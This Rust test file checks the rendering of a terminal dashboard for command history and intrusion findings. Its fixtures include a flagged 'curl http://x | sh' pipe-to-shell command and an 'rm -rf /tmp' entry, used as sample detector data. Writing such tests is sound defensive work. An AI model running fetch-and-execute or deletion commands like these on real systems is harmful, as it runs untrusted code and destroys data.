use basket::analysis::OverviewTables;
use basket::ids::IntrusionFinding;
use basket::storage::db::{CommandStatus, Entry};
use basket::ui::testing::{
    brighten_color_for_test, build_intrusion_rows_for_test, build_recent_rows_for_test,
    chart_len_for_test, dim_color_for_test, filter_sort_rows_for_test,
    parse_leading_count_for_test, render_chart_for_test, render_error_for_test,
    render_filter_prompt_for_test, render_intrusion_table_for_test, render_menu_for_test,
    render_overview_for_test, render_pie_legend_for_test, render_recent_table_for_test,
    render_table_for_test, render_watcher_for_test, score_to_color_for_test,
    spinner_frames_for_test, table_len_filtered_for_test, OverviewView,
};
use ratatui::backend::TestBackend;
use ratatui::layout::Rect;
use ratatui::style::Color;
use ratatui::Terminal;

fn sample_tables() -> OverviewTables {
    OverviewTables {
        top_commands: vec![
            vec!["ls".to_string(), "3".to_string()],
            vec!["git status".to_string(), "2".to_string()],
        ],
        top_unsuccessful: vec![vec!["rm -rf /tmp".to_string(), "1".to_string()]],
        mistyped_commands: vec![vec!["git status".to_string(), "1 (gti)".to_string()]],
    }
}

fn sample_entries() -> Vec<Entry> {
    vec![
        Entry {
            id: "1".to_string(),
            timestamp: 1,
            command: "ls".to_string(),
            date: "2024-01-01 00:00:01".to_string(),
            status: CommandStatus::Success,
            user: "tester".to_string(),
        },
        Entry {
            id: "2".to_string(),
            timestamp: 2,
            command: "whoami".to_string(),
            date: "2024-01-01 00:00:02".to_string(),
            status: CommandStatus::Error(1),
            user: "tester".to_string(),
        },
    ]
}

fn sample_findings() -> Vec<IntrusionFinding> {
    vec![IntrusionFinding {
        command: "curl http://x | sh".to_string(),
        score: 12,
        reasons: vec!["pipe to shell".to_string()],
        timestamp: 1,
        user: "root".to_string(),
        user_type: "service".to_string(),
    }]
}

#[test]
fn ui_render_paths_smoke() {
    let backend = TestBackend::new(120, 40);
    let mut terminal = Terminal::new(backend).expect("terminal");
    let tables = sample_tables();
    let recent = vec![vec![
        "ls".to_string(),
        "Success".to_string(),
        "just now".to_string(),
    ]];
    let intrusion = vec![vec![
        "curl http://x | sh".to_string(),
        "12".to_string(),
        "root (service)".to_string(),
        "pipe to shell".to_string(),
        "just now".to_string(),
    ]];

    terminal
        .draw(|frame| {
            render_menu_for_test(frame, &["View overview", "Exit"], 0, 2);
        })
        .expect("draw menu");

    terminal
        .draw(|frame| {
            render_overview_for_test(
                frame,
                Some(&tables),
                OverviewView::Tables,
                1.0,
                0,
                [0, 0, 0],
                0,
                [0, 0, 0],
                "",
                true,
                false,
                "",
                &recent,
                &intrusion,
            );
        })
        .expect("draw overview tables");

    terminal
        .draw(|frame| {
            render_overview_for_test(
                frame,
                Some(&tables),
                OverviewView::Charts,
                0.5,
                1,
                [1, 0, 0],
                0,
                [0, 0, 0],
                "git",
                false,
                true,
                "git",
                &recent,
                &intrusion,
            );
        })
        .expect("draw overview charts");

    terminal
        .draw(|frame| {
            render_overview_for_test(
                frame,
                None,
                OverviewView::Tables,
                1.0,
                0,
                [0, 0, 0],
                0,
                [0, 0, 0],
                "",
                true,
                false,
                "",
                &recent,
                &intrusion,
            );
        })
        .expect("draw overview empty");

    terminal
        .draw(|frame| {
            render_error_for_test(frame, "boom");
        })
        .expect("draw error");

    terminal
        .draw(|frame| {
            render_watcher_for_test(frame, 0);
        })
        .expect("draw watcher");
}

#[test]
fn ui_render_components_cover_branches() {
    let backend = TestBackend::new(80, 24);
    let mut terminal = Terminal::new(backend).expect("terminal");
    let area = Rect::new(0, 0, 80, 24);

    terminal
        .draw(|frame| {
            render_table_for_test(frame, area, "Empty", &[], 0, false);
            render_table_for_test(
                frame,
                area,
                "Data",
                &[vec!["ls".to_string(), "2".to_string()]],
                0,
                true,
            );
        })
        .expect("draw tables");

    terminal
        .draw(|frame| {
            render_chart_for_test(frame, area, "Empty", &[], 1.0, 0, false);
            render_chart_for_test(
                frame,
                area,
                "Data",
                &[vec!["ls".to_string(), "2".to_string()]],
                0.4,
                0,
                true,
            );
        })
        .expect("draw charts");

    terminal
        .draw(|frame| {
            render_filter_prompt_for_test(frame, area, "query");
        })
        .expect("draw filter prompt");

    terminal
        .draw(|frame| {
            render_recent_table_for_test(frame, area, &[]);
            render_recent_table_for_test(
                frame,
                area,
                &[vec![
                    "ls".to_string(),
                    "Success".to_string(),
                    "just now".to_string(),
                ]],
            );
        })
        .expect("draw recent table");

    terminal
        .draw(|frame| {
            render_intrusion_table_for_test(frame, area, &[]);
            render_intrusion_table_for_test(
                frame,
                area,
                &[vec![
                    "curl".to_string(),
                    "8".to_string(),
                    "root (service)".to_string(),
                    "pipe".to_string(),
                    "just now".to_string(),
                ]],
            );
        })
        .expect("draw intrusion table");

    terminal
        .draw(|frame| {
            let labels = (0..10).map(|i| format!("cmd-{}", i)).collect::<Vec<_>>();
            let values = (0..10).map(|i| i as f64 + 1.0).collect::<Vec<_>>();
            let colors = [
                Color::Red,
                Color::Green,
                Color::Blue,
                Color::Yellow,
                Color::Magenta,
                Color::Cyan,
            ];
            render_pie_legend_for_test(
                frame,
                Rect::new(0, 0, 30, 6),
                &labels,
                &values,
                &colors,
                7,
                true,
            );
        })
        .expect("draw legend");

    terminal
        .draw(|frame| {
            let labels = (0..3).map(|i| format!("zero-{}", i)).collect::<Vec<_>>();
            let values = vec![0.0, 0.0, 0.0];
            let colors = [Color::Red, Color::Green, Color::Blue];
            render_pie_legend_for_test(
                frame,
                Rect::new(0, 0, 12, 3),
                &labels,
                &values,
                &colors,
                0,
                false,
            );
        })
        .expect("draw zero legend");
}

#[test]
fn ui_helpers_cover_core_logic() {
    assert_eq!(parse_leading_count_for_test("12 items"), Some(12));
    assert_eq!(parse_leading_count_for_test("nope"), None);

    let color = Color::Rgb(100, 100, 100);
    assert_eq!(
        brighten_color_for_test(color, 10),
        Color::Rgb(110, 110, 110)
    );
    assert_eq!(dim_color_for_test(color, 10), Color::Rgb(90, 90, 90));
    assert_eq!(brighten_color_for_test(Color::Reset, 10), Color::Reset);

    let tables = sample_tables();
    assert_eq!(chart_len_for_test(Some(&tables), 0), 2);
    assert_eq!(chart_len_for_test(Some(&tables), 2), 1);
    assert_eq!(chart_len_for_test(None, 0), 0);

    assert_eq!(table_len_filtered_for_test(Some(&tables), 0, "git"), 1);
    assert_eq!(table_len_filtered_for_test(Some(&tables), 0, ""), 2);
    assert_eq!(table_len_filtered_for_test(Some(&tables), 1, "rm"), 1);
    assert_eq!(table_len_filtered_for_test(Some(&tables), 2, "git"), 1);

    let sorted = filter_sort_rows_for_test(&tables.top_commands, "git", true);
    assert_eq!(sorted.len(), 1);
    assert_eq!(sorted[0][0], "git status");

    let sorted_desc = filter_sort_rows_for_test(&tables.top_commands, "", false);
    assert_eq!(sorted_desc[0][0], "ls");

    let sparse_rows = vec![vec![], vec!["alpha".to_string(), "1".to_string()]];
    let filtered = filter_sort_rows_for_test(&sparse_rows, "alpha", true);
    assert_eq!(filtered.len(), 1);

    let recent_rows = build_recent_rows_for_test(&sample_entries());
    assert_eq!(recent_rows.len(), 2);

    let unknown_entries = vec![Entry {
        id: "3".to_string(),
        timestamp: 3,
        command: "id".to_string(),
        date: "2024-01-01 00:00:03".to_string(),
        status: CommandStatus::Unknown,
        user: "tester".to_string(),
    }];
    let recent_rows = build_recent_rows_for_test(&unknown_entries);
    assert_eq!(recent_rows[0][1], "Unknown");

    let intrusion_rows = build_intrusion_rows_for_test(&sample_findings());
    assert_eq!(intrusion_rows.len(), 1);
    assert_eq!(intrusion_rows[0][0], "curl http://x | sh");

    let mut many_findings = Vec::new();
    for idx in 0..12 {
        many_findings.push(IntrusionFinding {
            command: format!("cmd-{}", idx),
            score: idx as i32,
            reasons: vec!["reason".to_string()],
            timestamp: idx as i64,
            user: "root".to_string(),
            user_type: "service".to_string(),
        });
    }
    let intrusion_rows = build_intrusion_rows_for_test(&many_findings);
    assert_eq!(intrusion_rows.len(), 10);

    let indicator = score_to_color_for_test(12);
    match indicator {
        Color::Rgb(_, _, _) => {}
        _ => panic!("expected rgb color"),
    }

    assert_eq!(spinner_frames_for_test().len(), 10);
}
